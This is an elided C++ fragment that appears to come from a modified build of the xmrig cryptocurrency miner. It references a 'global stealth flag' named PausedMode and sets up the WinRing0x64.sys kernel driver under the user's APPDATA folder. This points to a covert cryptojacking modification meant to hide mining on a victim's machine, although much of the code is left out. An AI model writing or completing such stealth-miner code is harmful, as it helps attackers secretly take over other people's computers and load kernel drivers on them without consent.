...
extern bool PausedMode;  // <-- Reference global stealth flag from xmrig.cpp
namespace xmrig {
...
xmrig::Msr::Msr() : d_ptr(new MsrPrivate())
{
    ...
    size_t len;
    _wdupenv_s(&appDataPath, &len, L"APPDATA");
    const std::wstring path = std::wstring(appDataPath) + L"\\WinRing0x64.sys";
